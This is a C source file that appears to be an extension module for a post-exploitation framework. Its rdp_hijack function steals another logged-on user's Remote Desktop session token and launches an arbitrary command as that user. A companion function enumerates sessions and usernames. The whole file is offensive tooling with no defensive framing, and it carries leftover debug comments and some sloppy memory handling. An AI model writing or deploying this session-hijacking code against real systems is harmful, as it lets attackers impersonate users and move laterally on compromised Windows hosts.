#include "lua_mirv_extensions.h"

int rdp_hijack(ULONG sessionid, char *cmdline){
	HANDLE server;
	PWTS_SESSION_INFOA ppSessionInfo=NULL;
	WTS_SESSION_INFOA pSessionInfo;
	DWORD pCount;
	DWORD pLevel=1;
	DWORD i=0;
	LPSTR ppBuffer;
	DWORD bytesReturned;	
	HANDLE userToken=NULL;
	HANDLE pUserToken=NULL;
	//ULONG sessionid;
	DWORD dwCreationFlags=0;
	LPVOID environment=NULL;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	//char *cmdline;
	char *username;
	char *homedir;//[MAX_PATH];
	//char desktop[8192];
	//char buf[8192];
	//sprintf_s(buf,8192,"cmd.exe");
	server=WTSOpenServerA(WTS_CURRENT_SERVER_NAME);
	//printf("[DD] cmdline: %s\n",cmdline);
	//if(argc>2){
	//sessionid=atol(argv[1]);
	//printf("[*] Impersonating session: %i\n",sessionid);
	if(WTSQueryUserToken(sessionid,&userToken)){
		//if(DuplicateTokenEx(userToken,MAXIMUM_ALLOWED,NULL,SecurityIdentification,TokenPrimary,&pUserToken)){
		if(CreateEnvironmentBlock(&environment,pUserToken,FALSE)){
			ZeroMemory( &si, sizeof( STARTUPINFO ) );
			//WTSQuerySessionInformationA(server,sessionid,WTSWinStationName,&ppBuffer,&bytesReturned);
			//sprintf_s(desktop,8192,"%s\\default",ppBuffer);
			si.lpDesktop = "winsta0\\default";;
			si.cb=sizeof(STARTUPINFO);
			//WTSFreeMemory(ppBuffer);
			ZeroMemory( &pi,sizeof(pi));
			//cmdline=(char *)malloc(MAX_PATH +1);
			//GetUserProfileDirectoryA(userToken,homedir,&bytesReturned);
			//WTSUserConfigTerminalServerProfilePath
			//WTSQuerySessionInformationA(server,sessionid,WTSUserName,&ppBuffer,&bytesReturned);	
			WTSQuerySessionInformationA(server,sessionid,WTSUserName,&ppBuffer,&bytesReturned);

			username=_strdup(ppBuffer);
			WTSFreeMemory(ppBuffer);
			//WTSQueryUserConfigA(WTS_CURRENT_SERVER_NAME,username,WTSUserConfigTerminalServerProfilePath,&ppBuffer,&bytesReturned);
			homedir=(char *)malloc(MAX_PATH);
			//FIXME: get a better homedir
			sprintf_s(homedir,MAX_PATH,"C:\\");
			//homedir=_strdup(ppBuffer);
			//WTSFreeMemory(ppBuffer);
			//		printf("[D] homedir: %s\n",homedir);
			//sprintf_s(cmdline,MAX_PATH,"cmd.exe /C dir %s >output.txt",argv[2]);
			dwCreationFlags|= CREATE_UNICODE_ENVIRONMENT | NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;

			//WTSQuerySessionInformationA(server,sessionid,WTSWinStationName,&ppBuffer,&bytesReturned);
			//printf("station: %s",ppBuffer);

		//	printf("[DD] creating process\n");
			if(CreateProcessAsUserA(userToken,
				NULL,
				cmdline,
				//buf,
				NULL,
				NULL,
				FALSE,
				dwCreationFlags,
				environment,
				homedir,
				&si,
				&pi)){
					return pi.dwProcessId;
					//printf("[*]CreateProcessAsUserA succeeded! pid:%i, tid:%i\n",pi.dwProcessId,pi.dwProcessId);
			}else{
				return 0;//printf("[E] CreateProcessAsUserA failed: %i\n", GetLastError());
			}


			//}else{
			//printf("[E] CreateEnvironmentBlock failed: %i\n", GetLastError());
			//		}
		}else{
			return 0;//printf("[E] DuplicateTokenEx failed: %i\n", GetLastError());
		}


	}
	else{
		return 0;//printf("[E] WTSQueryUserToken failed: %i\n", GetLastError());
		//exit(-1);
	}
}
int get_rdp_sessions(struct rdp_sessions_struct ***sessions){
	HANDLE server;
	PWTS_SESSION_INFOA ppSessionInfo=NULL;
	WTS_SESSION_INFOA pSessionInfo;
	DWORD pCount;
	DWORD i;
	LPSTR ppBuffer;
	DWORD bytesReturned;
	struct rdp_sessions_struct **tmpsessions;
	//rdp_sessions *tmpsessions[];

	server=WTSOpenServerA(WTS_CURRENT_SERVER_NAME);
	if(WTSEnumerateSessionsA(server,0,1,&ppSessionInfo,&pCount)){
			tmpsessions=(struct rdp_sessions_struct**) malloc(sizeof(struct rdp_sessions_struct)*pCount);
			ZeroMemory(tmpsessions,sizeof(struct rdp_sessions_struct)*pCount);
			//	printf("pCount: %i,",pCount);
			for (i=0;i<pCount;++i){
				tmpsessions[i]=(struct rdp_sessions_struct *) malloc(sizeof(struct rdp_sessions_struct));
				tmpsessions[i]->id=i;
				//	printf("i = %i\n",i);
				pSessionInfo=ppSessionInfo[i];
//				printf("Session ID: %i; name: %s, ",pSessionInfo.SessionId,pSessionInfo.pWinStationName);
				if(WTSQuerySessionInformationA(server,pSessionInfo.SessionId,WTSUserName,&ppBuffer,&bytesReturned)){
					//printf("user: %s, ",ppBuffer);
					tmpsessions[i]->user=_strdup(ppBuffer);
					WTSFreeMemory(ppBuffer);
				}else{
					return -1;//printf("WTSQuerySessionInformation[WTSUserName] failed: %i\n", GetLastError());
				}
				if(WTSQuerySessionInformationA(server,pSessionInfo.SessionId,WTSWinStationName,&ppBuffer,&bytesReturned)){
					//printf("station: %s",ppBuffer);
						tmpsessions[i]->station=_strdup(ppBuffer);
					WTSFreeMemory(ppBuffer);
				}else{
					//printf("WTSQuerySessionInformation[WTSWinStationName] failed: %i\n", GetLastError());
				}
				//printf("\n");
			}
			WTSFreeMemory(ppSessionInfo);
			*sessions=tmpsessions;
			return pCount;
		}else //0014fb3c
		{
			return -1;
		//	printf("EnumerateSessions failed: %i\n", GetLastError());
		}
}